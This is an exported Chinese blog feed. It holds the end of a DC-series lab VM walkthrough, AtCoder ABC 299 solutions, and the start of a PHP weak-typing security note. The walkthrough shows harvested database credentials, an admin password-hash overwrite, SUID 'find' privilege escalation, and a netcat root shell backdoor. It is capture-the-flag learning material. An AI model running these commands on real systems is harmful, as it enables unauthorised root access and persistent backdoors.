class="line">      <span class="variable">$elements</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callable</span>, <span class="variable">$elements</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="数据库攻击"><a href="#数据库攻击" class="headerlink" title="数据库攻击"></a>数据库攻击</h1><p>当前目录下找到flag1，/home/flag4下发现flag4，flag1提示去看drupal默认配置文件，查看默认配置文件发现mysql敏感信息</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt;</span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt;</span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这边看到了flag2<br>登录mysql数据库，查看数据库信息，查看一下node和user表，发现flag3，uid为1，说明要admin权限。发现admin账户pass经过hash加密，hash加密算法不可知。<br>这边有两个思路，一个是我们注册一个账号将二者hash互换，但是注册时无法写密码，第二个便是我们找到加密脚本，将我们的密码加密后写入数据库。发现加密脚本位置scripts/password-hash.sh<br>这里为什么要看node表呢？？？(user表就不说了吧)<br>因为<a href="https://www.cnblogs.com/amw863/p/4551889.html">drupal node机制理解</a></p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br><span class="line">password: admin          hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</span><br></pre></td></tr></table></figure><p>更换管理员密码的hash。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录admin账户后拿到flag3。<br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.<br>FIND，-exec提示很明显了，find提权。flag4也提示我们要提权到root。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不同系统适用于不同的命令</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-print2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span></span><br></pre></td></tr></table></figure><p>尝试查看find是否有suid权限</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec whoami  \;</span><br></pre></td></tr></table></figure><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。<br>留一个root的netcat的后门</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;</span><br><span class="line">nc 192.168.124.145 4444</span><br></pre></td></tr></table></figure><p>拿到最后一个flag。</p><p>Well done!!!!</p><p>Hopefully you’ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey\<br>by contacting me via Twitter - @DCAU7</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC系列靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder Beginner Contest 299</title>
      <link href="/posts/ae73.html"/>
      <url>/posts/ae73.html</url>
      
        <content type="html"><![CDATA[<h1 id="AtCoder-Beginner-Contest-299"><a href="#AtCoder-Beginner-Contest-299" class="headerlink" title="AtCoder Beginner Contest 299"></a>AtCoder Beginner Contest 299</h1><h2 id="A-Treasure-Chest"><a href="#A-Treasure-Chest" class="headerlink" title="A - Treasure Chest"></a>A - Treasure Chest</h2><h3 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定一个包含 <code>|*.</code>的字符串，其中<code>|</code>两个，<code>*</code>一个，问<code>*</code>是否在两个<code>|</code>之间。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到两个<code>|</code>的下标<code>l，r</code>以及*的下标<code>mid</code>，看看是否满足 <code>l&lt; mid &lt; r</code>即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="type">int</span> a = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="type">int</span> b = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>,a + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> c = s.<span class="built_in">find</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(c &gt; a &amp;&amp; c &lt; b) cout &lt;&lt; <span class="string">&quot;in&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;out&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Trick-Taking"><a href="#B-Trick-Taking" class="headerlink" title="B - Trick Taking"></a>B - Trick Taking</h2><h3 id="题目大意-1"><a href="#题目大意-1" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定n个人的卡片，颜色为 <code>c[i]</code> ，数字为 <code>r[i]</code> 。</p><p>如果其中有颜色为 T 的牌，则该颜色中数字最大的卡片对应的人赢。如果没有，则颜色为第一个人的卡牌颜（ 即<code>c[0]</code> ）中数字最大的卡片对应的人赢。问谁赢。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>分两种情况模拟即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2</span>*<span class="number">1e5</span>*<span class="number">10</span>;;</span><br><span class="line"><span class="type">int</span> c[N],r[N];</span><br><span class="line"><span class="type">int</span> n, t;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (c[i] == t)</span><br><span class="line">        &#123;</span><br><span class="line">            res1 = <span class="built_in">max</span>(res1, r[i]);</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res1 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> res2 = r[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (c[i] == c[<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                res2 = <span class="built_in">max</span>(res2, r[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res2 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; c[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; r[i];</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dango"><a href="#C-Dango" class="headerlink" title="C - Dango"></a>C - Dango</h2><h3 id="题目大意-2"><a href="#题目大意-2" class="headerlink" title="题目大意"></a>题目大意</h3><p>定义一种字符串<code>s</code>的等级X是一个正整数），满足仅包含<code>-o</code>，且头或尾仅一处为<code>-</code>，其余都为<code>o</code>。其等级X为<code>o</code>的数量。给定一个字符串T，问其子串的最大等级。</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>依次遍历字符串T，遇到两个<code>-</code>时期间就有一个等级。</p><p>然后再考虑从头到第一个<code>-</code>的子串，从最后一个<code>-</code>到尾的子串的等级。</p><p>注意单纯的一个<code>-</code>并不是合法的（0不是正整数）。</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">S = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line">S = S + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">ans = -<span class="number">1</span></span><br><span class="line">j = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>) :</span><br><span class="line">    <span class="keyword">if</span> S[i] == <span class="string">&#x27;-&#x27;</span> :</span><br><span class="line">        l = i - j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> l &gt; <span class="number">0</span> <span class="keyword">and</span> (j &gt;= <span class="number">0</span> <span class="keyword">or</span> i &lt; N) :</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, l)</span><br><span class="line">        j = i</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2 id="D-Find-by-Query-abc299-d"><a href="#D-Find-by-Query-abc299-d" class="headerlink" title="D - Find by Query (abc299 d)"></a>D - Find by Query (abc299 d)</h2><h3 id="题目大意-3"><a href="#题目大意-3" class="headerlink" title="题目大意"></a>题目大意</h3><p>交互题。这里有个长度为n的01字符串 s，其中$s1=0$，$sn=1$。你可以询问$si$的值。输出一个位置$p$满足$sp≠sp+1$。给定字符串长度n，你最多问20次。 $n&lt;=2×10^5$。</p><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>感觉好像和某次 cf的交互题很像。</p><p>注意题意保证了$s1=0，sn=1$。</p><p>首先询问中间位置$mid=\frac{n}{2}$，如果$s{mid}=1$，由于sn=1，最坏情况很有可能这后半部份都是 1，显然我们不该去问。但因为$s_1=0，s_{mid}=1$，所以前半部份必定有一处$s_p=0,s_{p+1}=1$。 反之$s_{mid}=0$的情况同理。</p><p>这样，通过一次询问，我们可以把答案保证存在的区间砍半了。那最多砍$logn$次就找到结果了。由于 $n≤2×10^5$，所以不会超过20次。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    std::cin &gt;&gt; N;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = N;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> m = (l + r) / <span class="number">2</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;? &quot;</span> &lt;&lt; m &lt;&lt; std::endl;</span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        std::cin &gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;! &quot;</span> &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><h2 id="E-Nearest-Black-Vertex"><a href="#E-Nearest-Black-Vertex" class="headerlink" title="E - Nearest Black Vertex"></a>E - Nearest Black Vertex</h2><h3 id="题目大意-4"><a href="#题目大意-4" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定一张图，要求给点涂黑白色，要求至少有一个黑点，且满足k个要求。</p><p>每个要求 $(p_i,d_i)$表示点 pi距离黑点的最近距离恰好为 $d_i$。</p><p>点数、边数 $≤2000$</p><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意边数只有2000。</p><p>我们可以对每个要求的$p_i$进行BFS，把距离其小于d的点都标记为白色。</p><p>然后再对每个要求的 $p_i$进行 BFS，把距离其为d的且未被标记为白色的点标记为黑色。</p><p>如果有个要求没有找到可以被涂黑色的点，就无解了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N, M;</span><br><span class="line">    std::cin &gt;&gt; N &gt;&gt; M;</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        std::cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        u--, v--;</span><br><span class="line">        adj[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">        adj[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">bool</span>&gt; <span class="title">black</span><span class="params">(N, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> K;</span><br><span class="line">    std::cin &gt;&gt; K;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(K)</span>, <span class="title">d</span><span class="params">(K)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; p[i] &gt;&gt; d[i];</span><br><span class="line">        p[i]--;</span><br><span class="line">        </span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        dis[p[i]] = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(p[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (dis[x] &lt; d[i]) &#123;</span><br><span class="line">                black[x] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                    dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (black[i]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(i);</span><br><span class="line">            dis[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dis[p[i]] != d[i]) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;No\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Yes\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; black[i];</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Square-Subsequence"><a href="#F-Square-Subsequence" class="headerlink" title="F - Square Subsequence"></a>F - Square Subsequence</h2><p>不会</p><h2 id="G-Minimum-Permutation"><a href="#G-Minimum-Permutation" class="headerlink" title="G - Minimum Permutation"></a>G - Minimum Permutation</h2><p>不会</p><h2 id="Ex-Dice-Sum-Infinity"><a href="#Ex-Dice-Sum-Infinity" class="headerlink" title="Ex - Dice Sum Infinity"></a>Ex - Dice Sum Infinity</h2><p>不会</p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder Beginner Contest </tag>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP--安全特性</title>
      <link href="/posts/fba9.html"/>
      <url>/posts/fba9.html</url>
      
        <content type="html"><![CDATA[<h2 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h2><p><strong>强类型</strong></p><ul><li><p>所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J</p></li><li><p>java、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p></li></ul><p><strong>弱类型</strong></p><ul><li>对数据的类型要求并不严格，可以让数据类型互相转换。</li></ul><h2 id="PHP中“-”和“-”"><a href="#PHP中“-”和“-”" class="headerlink" title="PHP中“==”和“===”"></a>PHP中“==”和“===”</h2><p>“==”和“===”都是用来比较两个数值是否相等的操作符。</p><p>当比较的两个值都是相同类型时候“==”和“===”是相等的。</p><p>1==1（两个int）1.0==1.0（两个float）‘H1TerHub’==’H1TerHub‘（两个字符串）</p><p><strong>ATTENTION：在前后两个值的类型不一样的时候，‘==’会自动转换类型</strong></p><p><img src="https://i.loli.net/2021/09/28/3VSoM1K6I4dtmlg.png" alt="img"></p><p>一般看到“==”就可以关注是否存在弱类型比较</p><h3 id="“-”类型转换的规则"><a href="#“-”类型转换的规则" class="headerlink" title="“==”类型转换的规则"></a>“==”类型转换的规则</h3><p>1、字符串和数字比较，字符串会被转换成数字。</p><p>“admin”==0(true)//admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是true。</p><p>2、混合字符串转换成数字，看字符串的第一个。</p><p>“1admin”==1 “2admin”==2</p><p>3、字符串开头以xex开头，x代表数字。会被转换成科学计数法。</p><p>x*10^x的形式。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‘2e2’=2*10^2=200</span><br><span class="line">“-2e2”=-2*10^2 “0e2”=0*10^2=0 </span><br><span 